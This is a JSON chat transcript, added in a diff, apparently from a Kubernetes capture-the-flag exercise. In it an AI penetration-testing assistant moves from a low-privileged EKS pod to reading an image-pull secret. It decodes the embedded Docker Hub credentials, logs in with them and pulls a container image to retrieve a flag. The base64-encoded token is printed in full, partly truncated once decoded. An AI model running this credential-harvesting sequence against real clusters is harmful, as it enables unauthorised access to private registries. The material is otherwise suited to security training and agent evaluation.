@@ -1,0 +1,185 @@
+{
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a penetration testing assistant helping a security researcher evaluate the security of their Kubernetes cluster. Respond only with ready-to-run commands based on previous output. Do not use placeholders or commentary. Do not provide commands you already know the answer for! Commands must not require interactive mode and must help find vulnerabilities. Focus attack on the hints you are receiving!"
+      },
+      {
+        "role": "user",
+        "content": "Hints: You've hacked into a low-privileged AWS EKS pod. This challenge is called Registry Hunt. A thing we learned during our research: always check the container registries. For your convenience, the crane utility is already pre-installed on the machine.\nRecon output:\n['Command: kubectl auth can-i --list \\n Output: Resources ...']\nPlease begin."
+      },
+      {
+        "role": "assistant",
+        "content": "crane ls <registry-url>"
+      },
+      {
+        "role": "user",
+        "content": "Command: crane ls <registry-url>\nOutput:\nbash: syntax error near unexpected token `newline'"
+      },
+      {
+        "role": "assistant",
+        "content": "crane ls $(aws ecr describe-repositories --query 'repositories[].repositoryUri' --output text)"
+      },
+      {
+        "role": "user",
+        "content": "Command: crane ls $(aws ecr describe-repositories --query 'repositories[].repositoryUri' --output text)\nOutput:\nUnable to locate credentials..."
+      },
+      {
+        "role": "assistant",
+        "content": "aws sts get-caller-identity"
+      },
+      {
+        "role": "user",
+        "content": "Command: aws sts get-caller-identity\nOutput:\nUnable to locate credentials..."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secret -n kube-system"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secret -n kube-system\nOutput:\nError from server (Forbidden)..."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secret -n challenge2"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secret -n challenge2\nOutput:\nError from server (Forbidden)..."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get serviceaccount -n challenge2"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get serviceaccount -n challenge2\nOutput:\nError from server (Forbidden)..."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get pod -n challenge2"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get pod -n challenge2\nOutput:\nNAME                    READY   STATUS    RESTARTS      AGE\ndatabase-pod-2c9b3a4e   1/1     Running   14 (9d ago)   517d"
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl exec database-pod-2c9b3a4e -n challenge2 -- env"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl exec database-pod-2c9b3a4e -n challenge2 -- env\nOutput:\nError from server (Forbidden)..."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl logs database-pod-2c9b3a4e -n challenge2"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl logs database-pod-2c9b3a4e -n challenge2\nOutput:\nError from server (Forbidden)..."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl describe pod database-pod-2c9b3a4e -n challenge2"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl describe pod database-pod-2c9b3a4e -n challenge2\nOutput:\n...Image: eksclustergames/base_ext_image..."
+      },
+      {
+        "role": "assistant",
+        "content": "crane ls eksclustergames"
+      },
+      {
+        "role": "user",
+        "content": "Command: crane ls eksclustergames\nOutput:\nError: ... UNAUTHORIZED ..."
+      },
+      {
+        "role": "assistant",
+        "content": "kubectl get secret registry-pull-secrets-780bab1d -n challenge2 -o yaml"
+      },
+      {
+        "role": "user",
+        "content": "Command: kubectl get secret registry-pull-secrets-780bab1d -n challenge2 -o yaml\nOutput:\n.dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19"
+      },
+      {
+        "role": "assistant",
+        "content": "echo 'eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19' | base64 -d"
+      },
+      {
+        "role": "user",
+        "content": "Command: echo 'eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19' | base64 -d\nOutput:\n{\"auths\": {\"index.docker.io/v1/\": {\"auth\": \"ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==\"}}}"
+      },
+      {
+        "role": "assistant",
+        "content": "echo 'ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==' | base64 -d"
+      },
+      {
+        "role": "user",
+        "content": "Command: echo 'ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==' | base64 -d\nOutput:\neksclustergames:dckr_pat_YtncV..."
+      },
+      {
+        "role": "assistant",
+        "content": "crane auth login -u eksclustergames -p dckr_pat_YtncV..."
+      },
+      {
+        "role": "user",
+        "content": "Command: crane auth login -u eksclustergames -p dckr_pat_YtncV...\nOutput:\nlogged in via /home/user/.docker/config.json"
+      },
+      {
+        "role": "assistant",
+        "content": "crane ls eksclustergames/base_ext_image"
+      },
+      {
+        "role": "user",
+        "content": "Command: crane ls eksclustergames/base_ext_image\nOutput:\nlatest"
+      },
+      {
+        "role": "assistant",
+        "content": "crane pull eksclustergames/base_ext_image:latest ./image.tar"
+      },
+      {
+        "role": "user",
+        "content": "Command: crane pull eksclustergames/base_ext_image:latest ./image.tar\nOutput:\nimage.tar"
+      },
+      {
+        "role": "assistant",
+        "content": "tar -xvf image.tar"
+      },
+      {
+        "role": "user",
+        "content": "Command: tar -xvf image.tar\nOutput:\n3f4d...tar.gz\n193b...tar.gz\nmanifest.json"
+      },
+      {
+        "role": "assistant",
+        "content": "tar -xzvf 3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz"
+      },
+      {
+        "role": "user",
+        "content": "Command: tar -xzvf 3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz\nOutput:\nbin/... (many files)"
+      },
+      {
+        "role": "assistant",
+        "content": "tar -xzvf 193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gz"
+      },
+      {
+        "role": "user",
+        "content": "Command: tar -xzvf 193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gz\nOutput:\netc/\nflag.txt\n..."
+      },
+      {
+        "role": "assistant",
+        "content": "cat flag.txt"
+      },
+      {
+        "role": "user",
+        "content": "Command: cat flag.txt\nOutput:\nwiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}"
+      },
+      {
+        "role": "assistant",
+        "content": "Great job! You've found the flag."
+      }
+    ]
+  }
+  
